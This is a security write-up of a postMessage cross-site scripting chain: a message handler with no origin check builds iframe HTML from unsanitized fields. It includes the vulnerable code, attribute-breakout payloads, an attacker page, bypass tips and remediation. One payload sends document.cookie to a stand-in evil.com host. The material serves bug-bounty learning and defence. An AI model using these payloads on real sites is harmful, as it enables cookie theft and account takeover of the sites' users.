PostMessage XSS: Breaking Out of Iframe Attributes via Unsanitized Message Data

Based on Youghourta Ghannei's private program writeup · postMessage to DOM injection

Vulnerability

A web application creates floating page panels (help center, chat, feedback) by dynamically building iframe elements from postMessage data. The message handler has no origin check and the url, name, and id fields from the message are inserted directly into an HTML string via concatenation. An attacker breaks out of the iframe src attribute to inject arbitrary event handlers, achieving XSS.

The Vulnerable Code

The researcher discovered a postMessage listener that creates floating page elements. The handler builds an iframe using string concatenation with unsanitized message data:

window.addEventListener('message', function(event) {
  // NO ORIGIN CHECK - accepts messages from any source

  if (event.data && event.data.message === 'e:openFloatingPage') {
    var d = event.data.data;
    if (d && d.url && d.name && d.id) {
      // VULNERABLE: No sanitization on url, name, id
      // Values concatenated directly into HTML string
      var html = '<iframe src="' + d.url + '"' +
                 ' name="' + d.name + '"' +
                 ' id="' + d.id + '"' +
                 ' style="width:100%;height:300px;border:none">' +
                 '</iframe>';

      container.insertAdjacentHTML('beforeend', html);
    }
  }
});

Three injection points exist: d.url, d.name, and d.id. Each is placed inside an HTML attribute without sanitization.

The Exploitation Process

Step 1: Identify the Sink

The researcher searched the application's JavaScript for postMessage listeners and found the createFloatingPageElement pattern. The key insight: the values flow from event.data directly into an HTML string that's inserted via insertAdjacentHTML.

Step 2: Craft the Attribute Breakout

To break out of the src="..." attribute, inject a double quote followed by an event handler:

// The payload breaks out of the src attribute
// and injects an onload event handler

var message = {
  "message": "e:openFloatingPage",
  "data": {
    "id": "xss1",
    "name": "test",
    "url": 'https://example.com" onload="alert(document.cookie)'
  }
};

// This produces:
// <iframe src="https://example.com" onload="alert(document.cookie)"
//   name="test" id="xss1" ...></iframe>
//
// The onload fires when the iframe loads → XSS!

Step 3: Overcome X-Frame-Options

The initial payload failed because the target URL set X-Frame-Options: SAMEORIGIN, preventing it from loading in the iframe — which means onload still fires but the iframe shows an error.

The researcher found an alternate endpoint without framing protection:

// download.php didn't have X-Frame-Options!
// Found via directory enumeration with ffuf/dirsearch

// Refined payload using the frameable endpoint:
var message = {
  "message": "e:openFloatingPage",
  "data": {
    "id": "xss1",
    "name": "test",
    "url": '/download?p=test" onload="alert(document.cookie)'
  }
};

// The iframe loads /download?p=test successfully (no XFO)
// onload fires → JavaScript executes in parent context

Step 4: Send the Message

<!-- Attacker's page -->

<!-- Iframe the vulnerable page (if frameable) -->
<iframe id="target" src="https://target.com/app"></iframe>

<script>
document.getElementById('target').onload = function() {
  // Send the malicious postMessage
  this.contentWindow.postMessage({
    "message": "e:openFloatingPage",
    "data": {
      "id": "pwned",
      "name": "test",
      "url": '/download?p=x" onload="fetch(\'https://evil.com/steal?c=\'+document.cookie)'
    }
  }, '*');
};
</script>

<!-- Alternative: if target page has window.opener -->
<script>
var w = window.open('https://target.com/app');
setTimeout(function() {
  w.postMessage({
    "message": "e:openFloatingPage",
    "data": {
      "id": "pwned",
      "name": "test",
      "url": '/download?p=x" onload="alert(document.domain)'
    }
  }, '*');
}, 2000);
</script>

The Chain

Bug 1: postMessage listener with no origin validation

Bug 2: Message data inserted into HTML string without sanitization (attribute injection)

Bug 3: Frameable endpoint without X-Frame-Options (enables the iframe to actually load)

Result: XSS execution in the context of the target application — cookie theft, session hijacking, account takeover

Alternative Injection Points

The name and id fields are also injectable. Each provides a different breakout:

// Inject via name attribute:
{
  "id": "safe",
  "name": 'safe" onmouseover="alert(1)" x="',
  "url": "https://example.com"
}
// <iframe src="https://example.com"
//   name="safe" onmouseover="alert(1)" x=""
//   id="safe" ...>

// Inject via id to break out entirely:
{
  "id": 'x"><img src=x onerror=alert(1)><iframe x="',
  "name": "safe",
  "url": "https://example.com"
}
// Closes the iframe tag and injects a new img element

Why It Matters

This pattern is extremely common in modern web apps. Floating widgets (help, chat, feedback, notifications) often use postMessage to communicate between the parent page and embedded iframes. If the handler builds DOM elements from message data using string concatenation, every field is a potential XSS vector. The no-origin-check + string-concat-to-DOM combination is one of the most reliable postMessage XSS patterns.

Bug Bounty Tip

When you find a postMessage handler that creates DOM elements: (1) Check if any message field ends up in an HTML string (not just innerHTML — also insertAdjacentHTML, document.write, jQuery .html()). (2) Try breaking out of the attribute context with " followed by an event handler. (3) If the iframe onload doesn't fire because of X-Frame-Options, find a frameable endpoint on the same origin — static files, download pages, and API endpoints often lack framing headers. (4) You can also try srcdoc or javascript: as the URL to bypass framing entirely.

Remediation

  • Always validate event.origin against a strict allowlist before processing any postMessage
  • Never build HTML strings from message data. Use DOM APIs: iframe.setAttribute('src', url) safely sets the attribute without injection
  • Sanitize all values that will be used in HTML contexts — escape ", <, >, &
  • Add X-Frame-Options or CSP frame-ancestors to all pages, including static assets and download endpoints
  • Use a Content Security Policy with strict script-src to mitigate successful injection
